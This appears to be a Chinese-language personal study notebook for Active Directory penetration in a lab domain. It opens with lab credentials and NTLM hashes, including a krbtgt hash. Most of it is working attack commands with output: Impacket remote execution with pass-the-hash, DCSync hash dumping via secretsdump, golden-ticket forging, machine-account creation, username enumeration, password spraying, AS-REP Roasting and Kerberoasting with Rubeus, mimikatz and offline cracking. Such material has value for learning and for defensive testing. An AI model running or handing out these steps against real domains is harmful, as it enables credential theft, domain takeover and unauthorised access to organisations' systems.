环境

```
域控：
owa2010cn-god.god.org
windows2008
192.168.10.16 192.168.3.33
administrator/Admin123456        AAD3B435B51404EEAAD3B435B51404EE:ccef208c6485269c20db2cad21734fe7 

域内成员主机：
webserver.god.org
windows2008
192.168.10.15  192.168.3.31
administrator/admin!@#45       AAD3B435B51404EEAAD3B435B51404EE:518b98ad4178a53695dc997aa02d455c
god\dbadmin/admin!@#45 

krbtgt aad3b435b51404eeaad3b435b51404ee:b097d7ed97495408e1537f706c357fc5
```

做笔记时，面对书里大量的内容，我得先识别哪些部分是对我比较重要的，然后精学。每个章节，用自己的话或者提炼简要文字概括（自己能迅速明白），手操实验也重要，不要纸上谈兵。



# 域内工具的使用

## BloodHound

[BloodHoundAD · GitHub](https://github.com/BloodHoundAD/)



## Adfind

github 里没找到

这里简述下它的查询示例：

- 查询域信任关系
- 查询域控
- 机器相关的查询
- 用户相关的查询
- 组相关查询
- 委派相关查询
- 其它



## Admod

活动目录修改工具



修改示例：

- 创建用户
- 创建OU
- 将用户移动到指定OU
- 删除用户
- 重置用户密码
- 修改用户密码
- 修改域的 MAQ 为 0



## LAP

微软自带的活动目录查询工具



## Ldapsearch

活动目录查询工具

这里简述下它的查询示例：

- 查询域信任关系
- 查询域控
- 机器相关的查询
- 用户相关的查询
- 组相关查询
- 委派相关查询
- 其它



## PingCastle

域内安全检测工具

[Home - PingCastle](https://www.pingcastle.com/)



## Kekeo

针对 Kerberos 协议进行攻击的工具

作用可：

- 申请 TGT
- 申请 ST
- 约束性委派攻击



## Rubeus

Kekeo 的 升级版

[GitHub - GhostPack/Rubeus: Trying to tame the three-headed dog.](https://github.com/GhostPack/Rubeus)

作用很大：

- 申请 TGT
- 申请 ST
- 导入票据
- AS-REP Roasting 攻击
- Kerberoasting 攻击
- 委派攻击



## Mimikatz

可以从机器内存中提取密码、密码hash、PIN码、Kerberos 票据等

简述下它的模块：

- privilege
- sekurlsa
- kerberos
- lsadump
- sid



## Impacket

```bash
export PATH=/usr/share/doc/python3-impacket/examples:$PATH
```

python 处理网络协议的集合



### psexec.py

条件：目标主机开启 445 端口、IPS$ 和非 $IPC 的可写共享

工作组：

```bash
└─# psexec.py administrator:Admin12345@192.168.10.16
└─# psexec.py administrator@192.168.10.16 -hashes AAD3B435B51404EEAAD3B435B51404EE:ccef208c6485269c20db2cad21734fe7
```

域：

```bash
└─# psexec.py god/webadmin:admin\!\@\#45@192.168.10.15                                                                                                  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.10.15.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
```

```bash
└─# psexec.py god/webadmin@192.168.10.15 -hashes AAD3B435B51404EEAAD3B435B51404EE:518b98ad4178a53695dc997aa02d455c
```



### smbexec.py

条件：

目标主机开启 445 端口、IPS$ 和非 $IPC 的可写共享，可以使用除 ipc$ 共享外的其它共享。可以 -share 参数指定其它共享

工作组：

```bash
└─# smbexec.py administrator:Admin12345@192.168.10.16 -codec gbk
└─# smbexec.py administrator@192.168.10.16 -hashes AAD3B435B51404EEAAD3B435B51404EE:ccef208c6485269c20db2cad21734fe7 -codec gbk
```

 域：

```bash
└─# smbexec.py god/webadmin@192.168.10.15 -hashes AAD3B435B51404EEAAD3B435B51404EE:518b98ad4178a53695dc997aa02d455c

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
```

```bash
└─# smbexec.py god/administrator@192.168.10.16 -hashes AAD3B435B51404EEAAD3B435B51404EE:ccef208c6485269c20db2cad21734fe7 -codec gbk   
```



### wmiexec.py

条件：

开启 135 端口 和 445 端口，并依赖于 admin$

工作组：

```bash
└─# wmiexec.py administrator:Admin12345@192.168.10.16 -codec gbk
└─# wmiexec.py administrator@192.168.10.16 -hashes AAD3B435B51404EEAAD3B435B51404EE:ccef208c6485269c20db2cad21734fe7 -codec gbk
```

域：

```bash
└─# wmiexec.py god/webadmin@192.168.10.15 -hashes AAD3B435B51404EEAAD3B435B51404EE:518b98ad4178a53695dc997aa02d455c

[*] SMBv2.1 dialect used
[-] rpc_s_access_denied
```

```bash
└─# wmiexec.py god/administrator@192.168.10.16 -hashes AAD3B435B51404EEAAD3B435B51404EE:ccef208c6485269c20db2cad21734fe7 -codec gbk   
```



### atexec.py

通过计划任务执行命令

工作组：

```bash
└─# atexec.py administrator:Admin12345@192.168.10.16 whoami
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[!] This will work ONLY on Windows >= Vista
[*] Creating task \gSkPbcWs
[*] Running task \gSkPbcWs
[*] Deleting task \gSkPbcWs
[*] Attempting to read ADMIN$\Temp\gSkPbcWs.tmp
[*] Attempting to read ADMIN$\Temp\gSkPbcWs.tmp
nt authority\system
```

```bash
└─# wmiexec.py administrator@192.168.10.16 whoami -hashes AAD3B435B51404EEAAD3B435B51404EE:ccef208c6485269c20db2cad21734fe7
```

域：

```bash
└─# atexec.py god/webadmin@192.168.10.15  whoami -hashes AAD3B435B51404EEAAD3B435B51404EE:518b98ad4178a53695dc997aa02d455c                                    2 ⨯
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[!] This will work ONLY on Windows >= Vista
[*] Creating task \tQNtxEPh
[-] rpc_s_access_denied
```

```bash
└─# wmiexec.py god/administrator@192.168.10.16 whoami -hashes AAD3B435B51404EEAAD3B435B51404EE:ccef208c6485269c20db2cad21734fe7
```



### dcomexec.py

脚本通过 DCOM 在模版机上命令执行



```bash
└─# dcomexec.py administrator:Admin12345@192.168.10.16 whoami
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv2.1 dialect used
god\administrator 
```

```bash
└─# dcomexec.py webadmin:admin\!\@\#45@192.168.10.15 whoami                                                                                                   1 ⨯
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
```



```bash
└─# dcomexec.py administrator@192.168.10.16 whoami -hashes AAD3B435B51404EEAAD3B435B51404EE:ccef208c6485269c20db2cad21734fe7
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv2.1 dialect used
god\administrator
```



### smbclient.py

可向服务器上传文件

连接成功后的命令：

```bash
info #查看信息
shares #查看开启的共享
use xxx #使用指定共享
ls
cd
put xxx #上传文件
get xxx  #下载文件
```



工作组环境：

```bash
└─# smbclient.py administrator:Admin12345@192.168.10.16
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Type help for list of commands
# info
Version Major: 6
Version Minor: 1
Server Name: OWA2010CN-GOD
Server Comment: 
Server UserPath: c:\
Simultaneous Users: 16777216
# shares
Address
ADMIN$
C$
ExchangeOAB
GroupMetrics
IPC$
NETLOGON
SYSVOL
WMI_SHARE
# exit 
```

```bash
└─# smbclient.py administrator@192.168.10.16 -hashes AAD3B435B51404EEAAD3B435B51404EE:ccef208c6485269c20db2cad21734fe7
```



域环境：

```bash
└─# smbclient.py god/administrator@192.168.10.16 -hashes AAD3B435B51404EEAAD3B435B51404EE:ccef208c6485269c20db2cad21734fe7
```

```bash
└─# smbclient.py god/administrator:Admin12345@192.168.10.16
```



### secretsdump.py

根据 DCSync 功能导出 域内用户的 hash，需要连接的账户和密码具有 DCSync 权限



获取域内所有用户的 Hash

```bash
secretsdump.py god/administrator:Admin12345@192.168.10.16 -just-dc
secretsdump.py god/webadmin:admin\!\@\#45@192.168.10.15 -just-dc  失败
```

使用卷影复制导出域内所有 Hash

```bash
secretsdump.py god/administrator:Admin12345@192.168.10.16 -use-vss
```

获取域内指定用户 krbtgt 用户的 Hash

```bash
secretsdump.py god/administrator:Admin12345@192.168.10.16 -just-dc-user krbtgt
```

如果当前导入了管理员票据，则不需要密码即可导出 Hash

```bash
secretsdump.py -k -no-pass owa2010cn-god.god.org -just-dc-user administrator
```

如果是域林，则在指定用户需要加上 域前缀

```bash
secretsdump.py xie/administrator:P@ssword1234@10.211.55.4 -just-dc-user "xie\krbtgt"
```



### ticketer.py

生成黄金票据

- 域的 SID

  ```
  wmic useraccount get name,sid
  ```

  `S-1-5-21-1218902331-2157346161-1782232778`

- krbtgt Hash

  ```
  aad3b435b51404eeaad3b435b51404ee:b097d7ed97495408e1537f706c357fc5
  ```

  

1、生成黄金票据

记得先绑定 hosts `echo "192.168.10.16 god.org" >> /etc/hosts`

```bash
ticketer.py -domain-sid  S-1-5-21-1218902331-2157346161-1782232778 -nthash b097d7ed97495408e1537f706c357fc5 -domain god.org administrator
```

2、导入票据

```bash
export KRB5CCNAME=administrator.ccache
```

3、无需密码导出 域内 Hash

```bash
secretsdump.py -k -no-pass administrator@owa2010cn-god.god.org -dc-ip 192.168.10.16
```

<img src=".\图片\Snipaste_2023-09-19_16-21-26.png" alt="Snipaste_2023-09-19_16-21-26" style="zoom:67%;" />



清除票据的话，我没找到命令，但是可以 随意新建一个 no.ccache 文件

```
export KRB5CCNAME=no.ccache  就算清除了之前导入的 administrator.ccache
```

我真是小天才



### getTGT.py

请求 TGT

```bash
┌──(root💀kali)-[~]
└─# getTGT.py god/administrator@192.168.2.9 -dc-ip=192.168.2.9           
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:  Admin12345
[*] Saving ticket in administrator@192.168.2.9.ccache
```



### getST.py

请求 ST

```bash
#提供账号密码请求指定的 SPN 服务票据
getST.py -dc-ip 10.211.55.4 -spn cifs/ad01.xie.com xie.com/administrator:P@ssword1234
#导入票据
export KRB5CCNAME=administrator.ccache
#访问该服务
smbexec.py -np-pass -k ad01.xie.com

#使用 TGT 生成 ST 票据过程如下
#导入上一步请求 TGT 生成的票据
export=administrator@10.211.55.4.ccache
#请求指定 SPN 的 ST
getST.py -dc-ip 10.211.55.4 -k -no-pass -spn cifs/ad01.xie.com xie.com/administrator:P@ssword1234
#导入票据
export=administrator@10.211.55.4.ccache
#访问该服务
smbexec.py -np-pass -k ad01.xie.com
```



### lookupsid.py

如果得到任意域内的一组账号密码，则可以利用次脚本得到该域的 SID 值

```bash
└─# lookupsid.py god/webadmin:admin\!\@\#45@192.168.2.15 -domain-sids    是 webserver
└─# lookupsid.py god/webadmin:admin\!\@\#45@192.168.2.9 -domain-sids   是 owa2010cn
```

```
[*] Brute forcing SIDs at 192.168.2.15
[*] StringBinding ncacn_np:192.168.2.15[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1218902331-2157346161-1782232778
498: GOD\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: GOD\Administrator (SidTypeUser)
501: GOD\Guest (SidTypeUser)
502: GOD\krbtgt (SidTypeUser)
512: GOD\Domain Admins (SidTypeGroup)
513: GOD\Domain Users (SidTypeGroup)
514: GOD\Domain Guests (SidTypeGroup)
515: GOD\Domain Computers (SidTypeGroup)
516: GOD\Domain Controllers (SidTypeGroup)
517: GOD\Cert Publishers (SidTypeAlias)
518: GOD\Schema Admins (SidTypeGroup)
519: GOD\Enterprise Admins (SidTypeGroup)
520: GOD\Group Policy Creator Owners (SidTypeGroup)
521: GOD\Read-only Domain Controllers (SidTypeGroup)
553: GOD\RAS and IAS Servers (SidTypeAlias)
571: GOD\Allowed RODC Password Replication Group (SidTypeAlias)
572: GOD\Denied RODC Password Replication Group (SidTypeAlias)
1000: GOD\OWA2010CN-GOD$ (SidTypeUser)
1101: GOD\DnsAdmins (SidTypeAlias)
1102: GOD\DnsUpdateProxy (SidTypeGroup)
1103: GOD\Organization Management (SidTypeGroup)
1104: GOD\Public Folder Management (SidTypeGroup)
1105: GOD\Recipient Management (SidTypeGroup)
1106: GOD\View-Only Organization Management (SidTypeGroup)
1107: GOD\UM Management (SidTypeGroup)
1108: GOD\Help Desk (SidTypeGroup)
1109: GOD\Records Management (SidTypeGroup)
1110: GOD\Discovery Management (SidTypeGroup)
1111: GOD\Server Management (SidTypeGroup)
1112: GOD\Delegated Setup (SidTypeGroup)
1113: GOD\Hygiene Management (SidTypeGroup)
1114: GOD\Exchange Servers (SidTypeGroup)
1115: GOD\Exchange Trusted Subsystem (SidTypeGroup)
1116: GOD\Exchange Windows Permissions (SidTypeGroup)
1117: GOD\Exchange All Hosted Organizations (SidTypeGroup)
1118: GOD\ExchangeLegacyInterop (SidTypeGroup)
1119: GOD\SM_6ef9b5ce414946ae9 (SidTypeUser)
1120: GOD\SM_d80bb46e75164f258 (SidTypeUser)
1121: GOD\SM_d3853544b62a421fb (SidTypeUser)
1122: GOD\SM_c330a5709f6a478b8 (SidTypeUser)
1123: GOD\$331000-U3VF1DKMCN71 (SidTypeGroup)
1124: GOD\mary (SidTypeUser)
1126: GOD\jenkins (SidTypeUser)
1127: GOD\mack (SidTypeUser)
1128: GOD\hr (SidTypeUser)
1129: GOD\boss (SidTypeUser)
1130: GOD\dbadmin (SidTypeUser)
1131: GOD\vpnadm (SidTypeUser)
1132: GOD\webadmin (SidTypeUser)
1133: GOD\MARY-PC$ (SidTypeUser)
1134: GOD\JACK-PC$ (SidTypeUser)
1135: GOD\fileadmin (SidTypeUser)
1136: GOD\WEBSERVER$ (SidTypeUser)
1137: GOD\FILESERV$ (SidTypeUser)
1138: GOD\SQLSERVER$ (SidTypeUser)
1139: GOD\fedora (SidTypeUser)
1140: GOD\kali (SidTypeUser)
1141: GOD\debian (SidTypeUser)
1142: GOD\itadmin (SidTypeUser)
1143: GOD\devadmain (SidTypeUser)
1144: GOD\logers (SidTypeUser)
1145: GOD\logtest (SidTypeUser)
1146: GOD\klion (SidTypeUser)
1147: GOD\klionsec (SidTypeUser)
1148: GOD\dadd (SidTypeUser)
1149: GOD\SAMTHEADMIN-68$ (SidTypeUser)
1150: GOD\SAMTHEADMIN-61$ (SidTypeUser)
```



### addcomputer.py

增加机器账户

在基于资源的约束性委派攻击中，我们往往需要控制一个机器账户



SARM 协议远程创建机器账户为 machine1$ ，密码为 root。默认无 SPN

```bash
addcomputer.py -computer-name 'machine1$' -computer-pass 'root' -dc-ip 192.168.2.9 'god.org/webadmin:admin!@#45' -method SAMR -debug
```



LDAP 协议远程创建机器账户为 machine2$ ，密码为 root。默认有 SPN

```bash
addcomputer.py -computer-name 'machine2$' -computer-pass 'root' -dc-ip 192.168.2.9 'god.org/webadmin:admin!@#45' -method LDAPS -debug
```



修改已经创建机器账户的密码，将 machine1$ 密码修改为 roots

```bash
addcomputer.py -computer-name 'machine1$' -computer-pass 'roots' -dc-ip 192.168.2.9 'god.org/webadmin:admin!@#45' -method SAMR -debug -no-add
```



### GetNPUsers.py

**AS-REP Roasting** 攻击

查找不需要进行域身份验证的用户，并获取 该账户 Hash 加密的 Login Session Key 

先整理一份字典 `user.list`

```
Administrator            
boss                     
dadd                     
dbadmin                  
debian                   
devadmain                
fedora                   
fileadmin                
Guest                    
hr                       
itadmin                  
jenkins                  
kali                     
klion                    
klionsec                 
krbtgt                   
logers                   
logtest                  
mack                     
mary                       
vpnadm                   
webadmin  
```



```
GetNPUsers.py -dc-ip 192.168.2.9 -usersfile user.list format john god.org/
```



### GetUserSPNs.py

`kerberoasting` 攻击



查找所在域注册在用户下的 SPN：

```bash
GetUserSPNs.py -dc-ip 192.168.2.9 god.org/webadmin:admin\!\@\#45
```

```
ServicePrincipalName  Name      MemberOf  PasswordLastSet             LastLogon                   Delegation  
--------------------  --------  --------  --------------------------  --------------------------  -----------
priv/test             webadmin            2019-04-14 05:29:33.303878  2023-09-19 08:18:06.468714  constrained 
```



请求注册于用户下所有 SPN 的 ST ，并以 hashcat 能破解的格式保存为 hash.txt

```bash
GetUserSPNs.py -request -dc-ip 192.168.2.9 god.org/webadmin:admin\!\@\#45 -outputfile hash.txt
```



请求注册在指定用户下的 SPN 的 ST，并以 hashcat 能破解的格式保存为 hash.txt

```bash
GetUserSPNs.py -request -dc-ip 192.168.2.9 god.org/webadmin:admin\!\@\#45 -outputfile hash.txt -request-user webadmin
```



### ticketConverter.py

可将 .ccache 和 .kirbi 两种格式的票据进行转换

```bash
ticketConverter.py administrator.ccache administrator.kirbi
ticketConverter.py  administrator.kirbi administrator.ccache
```



### addspn.py

可查询、增加、删除 SPN，增加需要管理员权限，删除则只需要对目标属性具有修改的权限

[krbrelayx/README.md at master · dirkjanm/krbrelayx · GitHub](https://github.com/dirkjanm/krbrelayx/blob/master/README.md)

```
usage: addspn.py [-h] [-u USERNAME] [-p PASSWORD] [-t TARGET] -s SPN [-r] [-q]
                 [-a]
                 HOSTNAME

Add an SPN to a user/computer account

Required options:
  HOSTNAME              Hostname/ip or ldap://host:port connection string to
                        connect to

Main options:
  -h, --help            show this help message and exit
  -u USERNAME, --user USERNAME
                        DOMAIN\username for authentication
  -p PASSWORD, --password PASSWORD
                        Password or LM:NTLM hash, will prompt if not specified
  -t TARGET, --target TARGET
                        Computername or username to target (FQDN or COMPUTER$
                        name, if unspecified user with -u is target)
  -s SPN, --spn SPN     servicePrincipalName to add (for example:
                        http/host.domain.local or cifs/host.domain.local)
  -r, --remove          Remove the SPN instead of add it
  -q, --query           Show the current target SPNs instead of modifying
                        anything
  -a, --additional      Add the SPN via the msDS-AdditionalDnsHostName
                        attribute
```



# 域内渗透手法

## 域内用户名枚举

Kerberos 在协议认证 的 AS-REQ 阶段，请求包的 cname 值是用户名。当用户状态为 存在启动 、存在但禁用 、 不存在 时，返回的 AS-REP 包各不相同，所以存在用户名枚举。

### 工具使用

1、Kerbrute 工具

```bash
└─# ./Desktop/kerbrute_linux_amd64 userenum --dc 192.168.2.15 -d god.org user.list

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/20/23 - Ronnie Flathers @ropnop

2023/09/20 08:05:52 >  Using KDC(s):
2023/09/20 08:05:52 >  	192.168.2.15:88

2023/09/20 08:05:52 >  [+] VALID USERNAME:	 administrator@god.org
2023/09/20 08:05:52 >  [+] VALID USERNAME:	 webadmin@god.org
2023/09/20 08:05:52 >  Done! Tested 3 usernames (2 valid) in 0.003 seconds
```

2、msf

```bash
msf6 > use auxiliary/gather/kerberos_enumusers 
msf6 auxiliary(gather/kerberos_enumusers) > set domain god.org
domain => god.org
msf6 auxiliary(gather/kerberos_enumusers) > set rhosts 192.168.2.15
rhosts => 192.168.2.15
msf6 auxiliary(gather/kerberos_enumusers) > set user_file user.list
user_file => user.list
msf6 auxiliary(gather/kerberos_enumusers) > run

[*] Using domain: GOD.ORG - 192.168.2.15:88      ...
[+] 192.168.2.15 - User: "administrator" is present
[!] No active DB -- Credential data will not be saved!
[+] 192.168.2.15 - User: "webadmin" is present
[*] 192.168.2.15 - User: "xxxxxxxxxxx" user not found
[*] Auxiliary module execution completed
```

3、pyKerbrute

[pyKerbrute](https://github.com/3gstudent/pyKerbrute)



补充一下， 如下命令可以查看密码策略

```bash
└─# crackmapexec  smb --pass-pol 192.168.2.15
```



### 抓包分析

Adminisreator 用户存在包 ，AS-REQ 里存在 用户名字段

<img src=".\图片\Snipaste_2023-09-20_20-14-34.png" alt="Snipaste_2023-09-20_20-14-34" style="zoom:67%;" />



不存在用户的响应包 AS-REP ，返回信息与存在用户的响应包 不一样

<img src=".\图片\Snipaste_2023-09-20_20-21-14.png" alt="Snipaste_2023-09-20_20-21-14" style="zoom:67%;" />



## 密码喷洒

还是在 AS-REQ 阶段，当用户名存在时，正确或者错误的密码两种情况下， AS-REP 返回包各不相同，可以用这个特性枚举密码。

通常情况下可以已知用户名去枚举密码，也可以已知密码去枚举用户名，也可以用户名和密码一起枚举。但是目标域可能设置了锁定策略，比如同一个用户连续输错密码时用户会被锁定。

### 工具

1、Kerbrute

```bash
└─# ./Desktop/kerbrute_linux_amd64 passwordspray --dc 192.168.2.15 -d god.org user.list Admin12345

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/20/23 - Ronnie Flathers @ropnop

2023/09/20 08:36:04 >  Using KDC(s):
2023/09/20 08:36:04 >  	192.168.2.15:88

2023/09/20 08:36:04 >  [+] VALID LOGIN:	 administrator@god.org:Admin12345
```

```bash
└─# ./Desktop/kerbrute_linux_amd64 passwordspray --dc 192.168.2.15 -d god.org user.list admin\!\@\#45                                                         1 ⨯

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/20/23 - Ronnie Flathers @ropnop

2023/09/20 08:36:37 >  Using KDC(s):
2023/09/20 08:36:37 >  	192.168.2.15:88

2023/09/20 08:36:37 >  [+] VALID LOGIN:	 webadmin@god.org:admin!@#45
```

2、crackmapexec，这个是 smb 的认证

```bash
└─# crackmapexec smb 192.168.2.15 -u user.list -p pass.list --no-bruteforce --continue-on-success
SMB         192.168.2.15    445    OWA2010CN-GOD    [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:OWA2010CN-GOD) (domain:god.org) (signing:True) (SMBv1:True)
SMB         192.168.2.15    445    OWA2010CN-GOD    [+] god.org\administrator:Admin12345 (Pwn3d!)
SMB         192.168.2.15    445    OWA2010CN-GOD    [+] god.org\webadmin:admin!@#45 (Pwn3d!)
SMB         192.168.2.15    445    OWA2010CN-GOD    [-] god.org\xxxxxxxxxxx:xxxxxxxxxx STATUS_LOGON_FAILURE 
```

3、pyKerbrute

4、DomainPasswordSprat.ps1  [GitHub - dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)



### 抓包分析

<img src=".\图片\Snipaste_2023-09-20_20-59-52.png" alt="Snipaste_2023-09-20_20-59-52" style="zoom:80%;" />



## AS-REP Roasting

在与域控设置 “ **不要求 Kerberos 预身份验证** “ 的账户时，发生在 Kerberos 身份验证的第一阶段 (AS_REQ&AS_REP) 时，攻击者请求票据时，**域控不会进行身份验证便直接把 TGT 和该用户的 Hash 加密的 Login Session Key 返回**，攻击者可离线破解 



### 配置

<img src=".\图片\Snipaste_2023-09-20_21-10-14.png" alt="Snipaste_2023-09-20_21-10-14" style="zoom:67%;" />



### 获取 Hash

1、Rubeus

```powershell
PS C:\Users\Administrator\Desktop> .\Rubeus.exe asreproast /format:john /outfile:hash.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4


[*] Action: AS-REP roasting

[*] Target Domain          : god.org

[*] Searching path 'LDAP://OWA2010CN-God.god.org/DC=god,DC=org' for AS-REP roastable users
[*] SamAccountName         : dbadmin
[*] DistinguishedName      : CN=dbadmin,CN=Users,DC=god,DC=org
[*] Using domain controller: OWA2010CN-God.god.org (fe80::c4fb:77be:1c52:ea3c%14)
[*] Building AS-REQ (w/o preauth) for: 'god.org\dbadmin'
[+] AS-REQ w/o preauth successful!
[*] Hash written to C:\Users\Administrator\Desktop\hash.txt

[*] Roasted hashes written to : C:\Users\Administrator\Desktop\hash.txt
```

破解 Hash：

```bash
└─# john --wordlist=/root/pass.list hash.txt 
admin!@#45       ($krb5asrep$dbadmin@god.org)   
```

2、ASREPRoast.ps1

[GitHub - HarmJ0y/ASREPRoast.](https://github.com/HarmJ0y/ASREPRoast)

3、GetNPUsers.py

当对于非域内机器，上述方法就不适用

可以使用 Adfind 查询不需要进行域身份验证的账号

```bash
PS C:\Users\Administrator\Desktop> .\AdFind.exe -h 192.168.2.15:389 god\webadmin up admin!@#45 -f "useraccountcontrol:1.
2.840.113556.1.4.803:=4194304" -dn

AdFind V01.56.00cpp Joe Richards (support@joeware.net) April 2021

Using server: OWA2010CN-God.god.org:389
Directory: Windows Server 2008 R2
Base DN: DC=god,DC=org

dn:CN=dbadmin,CN=Users,DC=god,DC=org
```

接着使用 GetNPUsers.py 可以使用用户名字典进行枚举，存在不需要进行域身份验证的账号时直接返回 Hash 加密的 Login Session Key

```bash
GetNPUsers.py -dc-ip 192.168.2.15 -userfile user.list -format john god.org/
```

```bash
└─# GetNPUsers.py -dc-ip 192.168.2.15 -usersfile user.list -format john god.org/
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User webadmin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$dbadmin@GOD.ORG:c46fa564a9bd0595fb73153f98cc9492$729db0e30b14c4e15c9f806efe00e581a7f4ec7ae010a2fe0cc764335663940088c596224017fd13976e376714235acb8750e8df9472474630f03a5fa27204bada49f6904f6fc12986039304945a25745aa50bbef292842f817bb1803a05fb0d9cc6b1e1bace290eeb7add04a0239eb44032521163f84a2416a35d29ef926efadfe86c87afb669b7bf0251bf8a7108713f68f82a755d2df34a03f607f15098acbc55e703be3f2fa1ef97ec8b789c01b0b6b4deda99e17d486953b412f0b69a9e222c805d6ba701cc3d23c1261faaadb35a8f22a8fa8d6714ae464977c52251a5113f
```



### 破解技巧

用 john 直接破解

```bash
john --wordlist=/root/pass.list hash.txt 
```

用 hashcat 时，要手动调整 Hash ，把 `$23` 加到正数第二个 $ 前面，再

```bash
hashcat -m 18200 hash.txt pass.txt --force
```



### 抓包分析

先看我们的 用户名 字典 user.list ，注意顺序

```bash
└─# cat user.list 
administrator
webadmin
xxxxxxxxxxx
dbadmin
```

<img src=".\图片\Snipaste_2023-09-20_21-51-37.png" alt="Snipaste_2023-09-20_21-51-37" style="zoom:80%;" />

dbadmin 用户的 AS-REP 包：

<img src=".\图片\Snipaste_2023-09-20_21-54-06.png" alt="Snipaste_2023-09-20_21-54-06" style="zoom:80%;" />



## Kerberoasting

发生在 Kerberos 协议的 **TGS-REP 阶段**， KDC 的 TGS 服务返回一个由服务 Hash 加密的 ST 给客户端。这个 ST 里存在 SPN 链接用户的 明文密码，如果是 **RC4_HMAC_MD5** 加密的，就可破解。

利用过程主要分为四步：

1. 查询域内注册在域用户下的 SPN
2. 请求指定 SPN 的 ST
3. 导出 请求的 ST
4. 对导出 ST 进行离线破解

### 步骤

#### 1、SPN的发现

工具1：RiskySPN：[GitHub - cyberark/RiskySPN: Detect and abuse risky SPNs](https://github.com/cyberark/RiskySPN)

```powershell
. .\Find-PotentiallyCrackableAccounts.ps1
Find-PotentiallyCrackableAccounts -FullData
```

```powershell
UserName        : webadmin
DomainName      : god.org
IsSensitive     : True
EncType         : RC4-HMAC
Description     :
IsEnabled       : True
IsPwdExpires    : False
PwdAge          : 1620
CrackWindow     : Indefinitely
SensitiveGroups :
MemberOf        :
DelegationType  : Protocol Transition
TargetServices  : {cifs/OWA2010CN-God.god.org/god.org, cifs/OWA2010CN-God.god.org, cifs/OWA2010CN-GOD, cifs/OWA2010CN-G
                  od.god.org/GOD...}
NumofServers    :
RunsUnder       : {@{Service=priv; Server=test; IsAccessible=No}}
AssociatedSPNs  : {priv/test}
```



工具2：GetUserSPNs

[GitHub - nidem/kerberoast](https://github.com/nidem/kerberoast)

```powershell
PS C:\Users\Administrator\Desktop> .\GetUserSPNs.ps1


ServicePrincipalName : kadmin/changepw
Name                 : krbtgt
SAMAccountName       : krbtgt    # krbtgt 用户无法利用，可忽略
MemberOf             : CN=Denied RODC Password Replication Group,CN=Users,DC=god,DC=org
PasswordLastSet      : 2018/12/22 16:28:32

ServicePrincipalName : priv/test
Name                 : webadmin
SAMAccountName       : webadmin
MemberOf             :
PasswordLastSet      : 2019/4/14 17:29:33



PS C:\Users\Administrator\Desktop> .\GetUserSPNs.vbs
```



工具3：PowerView.ps1

```powershell
PS C:\Users\Administrator\Desktop> . .\PowerView.ps1
PS C:\Users\Administrator\Desktop> Get-Netuser -SPN
```



#### 2、请求服务票据

工具1： `GetUserSPNs.py`

请求注册在用户下的所有 SPN 服务票据，并保存为 hash.txt

```bash
└─# GetUserSPNs.py -request -dc-ip 192.168.2.15 god.org/webadmin:admin\!\@\#45 -outputfile hash.txt
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name      MemberOf  PasswordLastSet             LastLogon                   Delegation  
--------------------  --------  --------  --------------------------  --------------------------  -----------
priv/test             webadmin            2019-04-14 05:29:33.303878  2023-09-20 08:55:04.214408  constrained 
```

请求特定用户 webadmin 下的 SPN 服务票据，并保存为 hash.txt，这里可以使用 bash 脚本循环 用户名 枚举票据

```bash
└─# GetUserSPNs.py -request -dc-ip 192.168.2.15 god.org/webadmin:admin\!\@\#45 -outputfile hash.txt -request-user webadmin
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name      MemberOf  PasswordLastSet             LastLogon                   Delegation  
--------------------  --------  --------  --------------------------  --------------------------  -----------
priv/test             webadmin            2019-04-14 05:29:33.303878  2023-09-20 10:30:54.241291  constrained 
```

工具2：Rubeus 请求

```powershell
.\Rubeus.exe kerberoast /format:john /outfile:hash.txt
```

```
.\Rubeus.exe kerberoast /format:john /outfile:hash.txt /spn:priv/test
```

工具3：mimikatz 请求

```powershell
mimikatz kerberos::ask /target:priv/test
```



#### 3、导出票据

```powershell
.\mimikatz "kerberos::list /export" "exit"
```

查看内存中的票据

```
klist
```

```
